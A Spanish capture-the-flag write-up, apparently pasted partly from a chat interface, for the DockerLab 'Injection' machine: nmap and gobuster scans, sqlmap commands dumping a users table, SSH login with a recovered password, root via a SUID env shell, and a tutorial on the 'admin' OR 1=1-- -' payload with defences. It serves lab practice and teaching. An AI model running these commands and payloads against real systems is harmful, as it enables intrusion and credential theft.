# 🚀 Informe de Explotación - Máquina Injection (DockerLab)

## 📌 Información General
- **Target IP:** `172.17.0.2`
- **Sistema Operativo:** Linux Ubuntu 22.04 (jammy)
- **Tecnologías:** Apache 2.4.52, PHP, MySQL (MariaDB)

---

## 🔍 1) Escaneo Inicial con `nmap`
```bash
nmap -sCV -sS -n -Pn -p- 172.17.0.2
```
**Resultados:**  
| Puerto | Servicio | Versión |
|--------|----------|-------------|
| 22/tcp | SSH      | OpenSSH 8.9p1 (Ubuntu) |
| 80/tcp | HTTP     | Apache 2.4.52 (Ubuntu) |

---

## 🔎 2) Enumeración con `Gobuster`
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
```
**Resultados:**  
- `/index.php` (200 - Página principal)  
- `/config.php` (200 - Archivo vacío)  
- `/server-status` (403 - Acceso denegado)  

---

## 💀 3) Explotación de SQL Injection con `sqlmap`
### 🔹 Detectando parámetros vulnerables
```bash
sqlmap -u "http://172.17.0.2/index.php" --forms --crawl=2 --batch
```
✔ **Confirmado:** `name` es vulnerable a SQL Injection.  

### 🔹 Extracción de Bases de Datos
```bash
sqlmap -u "http://172.17.0.2/index.php" --data "name=admin&password=admin&submit=Login" --dbs --batch
```
✔ Bases de datos encontradas:  
- `information_schema`
- `mysql`
- `performance_schema`
- `register` (la más relevante)
- `sys`

### 🔹 Extracción de Tablas en `register`
```bash
sqlmap -u "http://172.17.0.2/index.php" --data "name=admin&password=admin&submit=Login" -D register --tables --batch
```
✔ Tablas encontradas:  
- `users`

### 🔹 Extracción de Columnas en `users`
```bash
sqlmap -u "http://172.17.0.2/index.php" --data "name=admin&password=admin&submit=Login" -D register -T users --columns --batch
```
✔ Columnas encontradas:  
| Columna  | Tipo |
|----------|-------------|
| username | varchar(30) |
| passwd   | varchar(30) |

### 🔹 Extracción de Usuarios y Contraseñas
```bash
sqlmap -u "http://172.17.0.2/index.php" --data "name=admin&password=admin&submit=Login" -D register -T users -C username,passwd --dump --batch
```
✔ Credenciales obtenidas:  
```plaintext
usuario: admin | contraseña: ??????????????
usuario: user1 | contraseña: ??????????????
```
(Si las contraseñas están en hash, proceder a crackeo).

### [17:33:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: PHP, Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:33:39] [INFO] fetching entries of column(s) 'passwd,username' for table 'users' in database 'register'
[17:33:39] [INFO] retrieved: 'KJSDFG789FGSDF78'
[17:33:39] [INFO] retrieved: 'dylan'
Database: register
Table: users
[1 entry]
+----------+------------------+
| username | passwd           |
+----------+------------------+
| dylan    | KJSDFG789FGSDF78 |
+----------+------------------+


---

## 🔓 4) Intento de Acceso con Credenciales
Si las credenciales están en texto plano, probarlas en:  
- **Login web**: `http://172.17.0.2`  
- **SSH**:  
```bash
ssh usuario@172.17.0.2
```

Si están cifradas, crackearlas con:  
```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 📌 5) Próximos Pasos
✅ Revisar permisos y archivos sensibles en el servidor.  
✅ Intentar escalación de privilegios si logramos acceso.  
✅ Buscar configuraciones débiles (`sudo -l`, `find / -perm -4000 -user root`).  

### ┌──(pol㉿kali)-[~/Escritorio/dockerlab]
└─$ ssh dylan@172.17.0.2
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.12.13-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dylan@082f666783ef:~$ whoami
dylan
dylan@082f666783ef:~$ find / -perm -4000 -user root 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/umount
/usr/bin/env
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
dylan@082f666783ef:~$ /usr/bin/env /bin/sh -p
# whoami
root
# 
🔓 4) Escalada de Privilegios a Root
Después de obtener acceso a la máquina como usuario dylan, buscamos binarios con SUID activos, lo que puede permitir escalación de privilegios.

🔹 Buscando binarios con SUID activado
bash
Mostrar siempre los detalles

Copiar
find / -perm -4000 -user root 2>/dev/null
✔ Resultados:

swift
Mostrar siempre los detalles

Copiar
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/umount
/usr/bin/env  <-- Binario vulnerable
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
🔹 Explotando env para obtener root
env con SUID nos permite ejecutar /bin/sh como root sin restricciones:

bash
Mostrar siempre los detalles

Copiar
/usr/bin/env /bin/sh -p
✔ Confirmado: Acceso root conseguido

bash
Mostrar siempre los detalles

Copiar
whoami
root


### Explicación de: 🔥 1) ¿Qué es la inyección SQL y por qué funciona?
📌 Concepto básico
Las aplicaciones web usan bases de datos (MySQL, PostgreSQL, SQL Server) para almacenar información, como usuarios y contraseñas.

Cuando un usuario ingresa su nombre y contraseña en un formulario de login, la web ejecuta una consulta SQL en la base de datos para verificar si los datos son correctos.

Por ejemplo, un código vulnerable en PHP haría algo así:

php
Copiar
Editar
$query = "SELECT * FROM users WHERE username = '$usuario' AND password = '$password'";
Si ingresamos:
📌 Usuario: admin
📌 Contraseña: admin123

La consulta que ejecuta el servidor sería:

sql
Copiar
Editar
SELECT * FROM users WHERE username = 'admin' AND password = 'admin123';
Si la consulta devuelve resultados, significa que el usuario existe y la web nos da acceso.

💀 2) ¿Cómo rompe esto una inyección SQL?
Si el código PHP no filtra correctamente lo que el usuario escribe, podemos modificar la consulta SQL para engañar a la base de datos.

Si en lugar de un usuario normal escribimos:
📌 Usuario: admin' OR 1=1-- -
📌 Contraseña: cualquier cosa

El servidor ejecuta esta consulta:

sql
Copiar
Editar
SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = 'cualquier cosa';
🔹 Explicación del ataque:

admin' → Cierra el ' original del código SQL.
OR 1=1 → Siempre es verdadero, lo que significa que la consulta devolverá todos los usuarios.
-- - → Comentario en SQL, que ignora el resto de la consulta (AND password = 'cualquier cosa').
Como 1=1 siempre es verdadero, el servidor piensa que la consulta es válida y nos da acceso sin importar la contraseña.

🚀 Resultado: ¡Entramos sin saber la contraseña real!

⚔ 3) ¿De dónde sale esto?
La inyección SQL existe desde hace más de 20 años y sigue siendo una de las vulnerabilidades más explotadas.

🔹 Ejemplo real: En 2011, el grupo de hackers LulzSec hackeó Sony y robó millones de cuentas usando SQL Injection.

🔹 Herramientas para automatizar este ataque:

sqlmap: Herramienta para automatizar inyecciones SQL.
Burp Suite: Para analizar y modificar peticiones web.
🔥 4) ¿Cómo protegerse de una inyección SQL?
1️⃣ Usar consultas preparadas (Prepared Statements)

En lugar de construir la consulta manualmente, se usa código seguro:
php
Copiar
Editar
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $usuario, $password);
$stmt->execute();
2️⃣ Validar y filtrar los inputs del usuario

Rechazar caracteres como ', ", --, ;, etc.
3️⃣ Configurar permisos mínimos en la base de datos

No usar root, sino un usuario con acceso limitado.
4️⃣ Usar un firewall de aplicaciones web (WAF)

Herramientas como ModSecurity pueden bloquear intentos de SQL Injection.
🎯 Resumen rápido
✅ SQL Injection funciona porque los formularios web mal protegidos permiten modificar consultas SQL.
✅ Truco clásico: "admin' OR 1=1-- -", que engaña a la base de datos para siempre devolver TRUE.
✅ Solución: Usar consultas preparadas y validar bien los inputs del usuario.

🚀 **Máquina comprometida con éxito.**  